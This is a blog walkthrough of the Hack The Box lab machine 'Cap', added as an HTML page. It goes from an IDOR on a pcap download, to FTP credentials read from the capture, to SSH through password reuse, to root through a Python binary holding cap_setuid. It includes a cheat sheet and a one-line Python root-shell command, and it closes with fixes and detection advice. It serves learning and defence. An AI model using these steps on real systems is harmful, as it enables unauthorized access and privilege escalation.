@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cap - HTB Walkthrough · Aymane El Ouafi</title>
+  <meta name="description" content="Easy Linux box: IDOR to grab a pcap, FTP creds in clear text, SSH as nathan, then root through python3.8 with cap_setuid.">
+  <meta name="author" content="Aymane El Ouafi">
+  <meta name="robots" content="index, follow, max-image-preview:large">
+  <link rel="canonical" href="https://aymaneelouafi.me/cap.html">
+  <link rel="icon" href="/images/skull.svg">
+
+  <!-- Open Graph (Facebook, LinkedIn, Discord...) -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Cap - HTB Walkthrough · Aymane El Ouafi">
+  <meta property="og:description" content="Easy Linux box: IDOR to grab a pcap, FTP creds in clear text, SSH as nathan, then root through python3.8 with cap_setuid.">
+  <meta property="og:url" content="https://aymaneelouafi.me/cap.html">
+  <meta property="og:site_name" content="Aymane El Ouafi">
+  <meta property="og:image" content="https://aymaneelouafi.me/images/og.png">
+
+  <!-- Twitter / X -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Cap - HTB Walkthrough · Aymane El Ouafi">
+  <meta name="twitter:description" content="Easy Linux box: IDOR to grab a pcap, FTP creds in clear text, SSH as nathan, then root through python3.8 with cap_setuid.">
+  <meta name="twitter:image" content="https://aymaneelouafi.me/images/og.png">
+
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Cap - HTB Walkthrough",
+  "description": "Easy Linux box: IDOR to grab a pcap, FTP creds in clear text, SSH as nathan, then root through python3.8 with cap_setuid.",
+  "datePublished": "2026-10-19",
+  "dateModified": "2026-10-19",
+  "author": {
+    "@type": "Person",
+    "name": "Aymane El Ouafi",
+    "url": "https://aymaneelouafi.me"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "Aymane El Ouafi",
+    "url": "https://aymaneelouafi.me"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://aymaneelouafi.me/cap.html"
+  },
+  "url": "https://aymaneelouafi.me/cap.html",
+  "image": "https://aymaneelouafi.me/images/og.png",
+  "keywords": "htb, walkthrough, linux, idor, wireshark, capabilities, privesc",
+  "inLanguage": "en"
+}
+  </script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Rubik+Glitch&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/style.css?v=1792492549120">
+</head>
+<body>
+  <main class="container post">
+
+    <a class="back" href="/index.html">← cd ..</a>
+
+    
+    <h1>Cap - HTB Walkthrough</h1>
+    <p class="post-meta">2026-10-19 · #htb #walkthrough #linux #idor #wireshark #capabilities #privesc</p>
+
+    <input id="post-search" class="search post-search" type="text"
+           placeholder="search in this post...  (Enter = next, Shift+Enter = previous, Esc = clear)"
+           autocomplete="off">
+    <p id="post-search-count" class="search-count" hidden></p>
+
+  <details class="cheatsheet">
+    <summary><span class="arrow">&#9656;</span> Cheat sheet &mdash; useful commands</summary>
+    <div class="cheat-body">
+      <div class="cheat-row">
+        <code>nmap -sT -sC -sV -O -p- --min-rate 10000 &lt;target&gt;</code>
+        <span>Full TCP port scan</span>
+      </div>
+      <div class="cheat-row">
+        <code>browse to /data/0</code>
+        <span>IDOR - grab another user's pcap</span>
+      </div>
+      <div class="cheat-row">
+        <code>Wireshark: filter 'ftp' &gt; Follow TCP Stream</code>
+        <span>Read FTP creds in clear text</span>
+      </div>
+      <div class="cheat-row">
+        <code>ssh nathan@&lt;target&gt;</code>
+        <span>Login (password reuse from FTP)</span>
+      </div>
+      <div class="cheat-row">
+        <code>getcap -r / 2&gt;/dev/null</code>
+        <span>Find files with capabilities</span>
+      </div>
+      <div class="cheat-row">
+        <code>/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code>
+        <span>Root via cap_setuid</span>
+      </div>
+    </div>
+  </details>
+
+  <nav class="toc">
+    <p class="prompt">$ cat contents.txt</p>
+    <ul>
+      <li><a href="#section-0">1. Enumeration</a></li>
+      <li><a href="#section-1">2. Foothold</a></li>
+      <li><a href="#section-2">3. Privilege Escalation</a></li>
+      <li><a href="#section-3">4. Lessons Learned</a></li>
+    </ul>
+  </nav>
+
+    <article id="content">
+<p><strong>Cap</strong> is an easy Linux machine on Hack The Box. The attack path in one line:</p>
+<blockquote>
+<p><strong>IDOR</strong> on the web app → download someone else&#39;s network capture → <strong>FTP credentials in clear text</strong> inside it → <strong>SSH</strong> as nathan (password reuse) → <strong>python3.8 has the <code>cap_setuid</code> capability</strong> → root.</p>
+</blockquote>
+<hr>
+<h2 id="section-0">1. Enumeration</h2>
+<h3>Nmap Scan :</h3>
+<p>Full TCP port scan (<code>-p-</code>) with default scripts (<code>-sC</code>), version detection (<code>-sV</code>) and OS detection (<code>-O</code>). <code>--min-rate 10000</code> makes it much faster.</p>
+<pre><code class="language-shell">
+┌─[aymane@parrot]─[~]
+└──╼ $sudo nmap -sT -sC -sV -O -p- --min-rate 10000 10.129.138.18
+[sudo] password for aymane: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-18 18:02 +00
+Nmap scan report for 10.129.138.18
+Host is up (0.15s latency).
+Not shown: 38619 closed tcp ports (conn-refused), 26913 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+80/tcp open  http    Gunicorn
+|_http-title: Security Dashboard
+|_http-server-header: gunicorn
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 89.66 seconds
+</code></pre>
+<p>3 open ports:</p>
+<ul>
+<li><strong>21</strong> : FTP (vsftpd 3.0.3)</li>
+<li><strong>22</strong> : SSH (OpenSSH 8.2p1)</li>
+<li><strong>80</strong> : a web app running on Gunicorn (a Python web server) called &quot;Security Dashboard&quot;</li>
+</ul>
+<h3>FTP Anonymous Login :</h3>
+<p>First easy check on FTP: is anonymous login allowed? (more about this in my <a href="ftp.html">Footprinting FTP</a> notes)</p>
+<pre><code class="language-shell">┌─[aymane@parrot]─[~]
+└──╼ $ftp 10.129.138.18
+Connected to 10.129.138.18.
+220 (vsFTPd 3.0.3)
+Name (10.129.138.18:aymane): anonymous
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp&gt; exit
+221 Goodbye.
+</code></pre>
+<p>No anonymous access, so we move to the web app.</p>
+<hr>
+<h2 id="section-1">2. Foothold</h2>
+<h3>The Web App and the IDOR :</h3>
+<p>The &quot;Security Dashboard&quot; has a <strong>Security Snapshot</strong> feature: it captures 5 seconds of network traffic and shows the result at <code>/data/&lt;id&gt;</code>, with a button to download the capture as a <code>.pcap</code> file. Each new capture gets the next number (<code>/data/1</code>, <code>/data/2</code>...).</p>
+<p>By changing the id in the URL to <strong><code>/data/0</code></strong>, we can see a capture that is not ours. The app never checks if the capture belongs to the user asking for it. This is called an <strong>IDOR</strong> (Insecure Direct Object Reference). Capture <code>0</code> was made before us, probably when the machine was set up, so it may contain interesting traffic. We download it.</p>
+<p><a href="images/cap/01.png" target="_blank" rel="noopener"><img src="images/cap/01.png" alt="Dashboard showing capture /data/0"></a></p>
+<h3>Analyzing the pcap in Wireshark :</h3>
+<p>We open <code>0.pcap</code> in Wireshark. There is FTP traffic in it, and since <strong>FTP is clear text</strong>, the <code>USER</code> and <code>PASS</code> commands are readable. Here with the filter <code>tcp.stream eq 3</code>:</p>
+<p><a href="images/cap/02.png" target="_blank" rel="noopener"><img src="images/cap/02.png" alt="Wireshark showing the FTP login packets"></a></p>
+<p>Right click on a packet → <strong>Follow → TCP Stream</strong> shows the whole FTP conversation as text. We get a username and a password:</p>
+<p><a href="images/cap/03.png" target="_blank" rel="noopener"><img src="images/cap/03.png" alt="Follow TCP Stream with USER nathan and his password"></a></p>
+<blockquote>
+<p>Tip: the filter <code>ftp</code> (or <code>ftp.request.command == &quot;PASS&quot;</code>) finds FTP logins quickly in a big capture.</p>
+</blockquote>
+<h3>FTP Login as nathan :</h3>
+<p>The credentials work on FTP, and we land in nathan&#39;s home folder:</p>
+<p><a href="images/cap/04.png" target="_blank" rel="noopener"><img src="images/cap/04.png" alt="FTP login as nathan"></a></p>
+<p><a href="images/cap/05.png" target="_blank" rel="noopener"><img src="images/cap/05.png" alt="Listing nathan's home folder"></a></p>
+<h3>User Flag :</h3>
+<p><a href="images/cap/06.png" target="_blank" rel="noopener"><img src="images/cap/06.png" alt="Downloading user.txt"></a></p>
+<p><a href="images/cap/07.png" target="_blank" rel="noopener"><img src="images/cap/07.png" alt="User flag"></a></p>
+<h3>SSH with the Same Password :</h3>
+<p>People often reuse the same password for different services. The FTP credentials also work for <strong>SSH</strong>, which gives us a real shell on the machine:</p>
+<p><a href="images/cap/08.png" target="_blank" rel="noopener"><img src="images/cap/08.png" alt="SSH login as nathan"></a></p>
+<hr>
+<h2 id="section-2">3. Privilege Escalation</h2>
+<h3>Running LinPEAS :</h3>
+<p><a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LinPEAS</a> is a script that automatically checks a Linux machine for common privilege escalation paths (SUID files, capabilities, cron jobs, passwords in files...).</p>
+<p>We host it on our machine with a Python web server:</p>
+<p><a href="images/cap/09.png" target="_blank" rel="noopener"><img src="images/cap/09.png" alt="Python HTTP server serving linpeas.sh"></a></p>
+<p>Then download it on the target in <code>/tmp</code>, make it executable and run it:</p>
+<p><a href="images/cap/10.png" target="_blank" rel="noopener"><img src="images/cap/10.png" alt="Downloading and running LinPEAS on the target"></a></p>
+<p><a href="images/cap/11.png" target="_blank" rel="noopener"><img src="images/cap/11.png" alt="LinPEAS basic information"></a></p>
+<h3>Interesting Finding: Capabilities :</h3>
+<p>LinPEAS shows that <strong><code>/usr/bin/python3.8</code> has the <code>cap_setuid</code> capability</strong>:</p>
+<p><a href="images/cap/12.png" target="_blank" rel="noopener"><img src="images/cap/12.png" alt="python3.8 with cap_setuid"></a></p>
+<p>We can also find this manually with:</p>
+<pre><code class="language-shell">getcap -r / 2&gt;/dev/null
+</code></pre>
+<h3>Why Does Python Have This Capability?</h3>
+<p>also in the flask app code :</p>
+<p><a href="images/cap/13.png" target="_blank" rel="noopener"><img src="images/cap/13.png" alt="Flask app code running tcpdump with os.setuid(0)"></a><br>we can see that the dev give this capability so he can run the command</p>
+<p>The app needs root to run <code>tcpdump</code> (capturing traffic needs high privileges). Instead of running the whole app as root, the developer gave <code>python3</code> the <code>cap_setuid</code> capability so the app can switch to root (<code>os.setuid(0)</code>) just for this command. The comment in the code says it all: <em>&quot;hacky solution for now&quot;</em>. The problem is that the capability is on the python binary itself, so <strong>any user</strong> who runs python3.8 gets it, not only the app.</p>
+<h3>What Are Linux Capabilities?</h3>
+<blockquote>
+<p>Linux capabilities are a kernel-level privilege model that breaks the all-or-nothing nature of root into discrete units of authority. Instead of giving a process full administrative power, an administrator can assign only the specific capability it needs, such as opening a privileged network port or adjusting selected system settings. In practice, this makes Linux capabilities a core least-privilege mechanism for services, daemons, containers, and other workloads that must perform a narrow privileged action without inheriting unrestricted root access.<br>The concept is closely tied to broader privilege management in the NIST Cybersecurity Framework 2.0, because it supports reducing unnecessary privilege exposure. The security value is not that capabilities eliminate risk, but that they make privilege more explicit, auditable, and easier to constrain than traditional setuid-root execution. </p>
+</blockquote>
+<p>Source : <a href="https://nhimg.org/glossary/linux-capabilities/">https://nhimg.org/glossary/linux-capabilities/</a></p>
+<h3>CAP_SETUID :</h3>
+<p><a href="images/cap/14.png" target="_blank" rel="noopener"><img src="images/cap/14.png" alt="CAP_SETUID in the capabilities man page"></a><br>Source : <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">https://man7.org/linux/man-pages/man7/capabilities.7.html</a></p>
+<p>In simple words: <code>cap_setuid</code> lets a process <strong>change its user ID to anyone, including 0 (root)</strong>. The <code>+eip</code> at the end of the LinPEAS line means the capability is active as soon as the binary runs. Giving it to an interpreter like Python is the same as giving root to everyone, because Python can call <code>setuid</code> itself.</p>
+<h3>Exploiting cap_setuid :</h3>
+<p>The same trick used for SUID Python works here:</p>
+<p><a href="images/cap/15.png" target="_blank" rel="noopener"><img src="images/cap/15.png" alt="Exploiting SUID Python3"></a><br>Source : <a href="https://computingforgeeks.com/linux-privilege-escalation-guide-kali/">https://computingforgeeks.com/linux-privilege-escalation-guide-kali/</a></p>
+<p>We open <code>python3.8</code>, change our UID to 0 with <code>os.setuid(0)</code>, then start a shell, which now runs as root:</p>
+<p><a href="images/cap/16.png" target="_blank" rel="noopener"><img src="images/cap/16.png" alt="Opening python3.8 and importing os"></a></p>
+<p><a href="images/cap/17.png" target="_blank" rel="noopener"><img src="images/cap/17.png" alt="os.setuid(0) then a root shell"></a></p>
+<p>Or in one line:</p>
+<pre><code class="language-shell">/usr/bin/python3.8 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<h3>Root Flag :</h3>
+<p><a href="images/cap/18.png" target="_blank" rel="noopener"><img src="images/cap/18.png" alt="Root flag"></a></p>
+<hr>
+<h2 id="section-3">4. Lessons Learned</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Problem</strong></th>
+<th><strong>Fix</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IDOR on <code>/data/&lt;id&gt;</code></td>
+<td>Check on the server that each capture belongs to the user who asks for it.</td>
+</tr>
+<tr>
+<td>FTP sends passwords in clear text</td>
+<td>Use SFTP or FTPS instead of plain FTP.</td>
+</tr>
+<tr>
+<td>Same password for FTP and SSH</td>
+<td>One password per service, and SSH keys instead of passwords.</td>
+</tr>
+<tr>
+<td><code>cap_setuid</code> on python3.8</td>
+<td>Never give powerful capabilities to interpreters. Run only the needed command with sudo rules or a small dedicated binary.</td>
+</tr>
+</tbody></table>
+<p><strong>Detection side:</strong> a non-root user&#39;s <code>python3</code> process calling <code>setuid(0)</code> and then spawning <code>/bin/bash</code> as root is very suspicious. It can be caught with auditd rules on the <code>setuid</code> syscall or with an EDR rule on &quot;interpreter spawning a root shell&quot;. Running <code>getcap -r /</code> regularly also helps to spot dangerous capabilities before an attacker does.</p>
+
+    </article>
+
+
+
+  </main>
+
+  <script src="/post.js?v=1792492549120"></script>
+</body>
+</html>
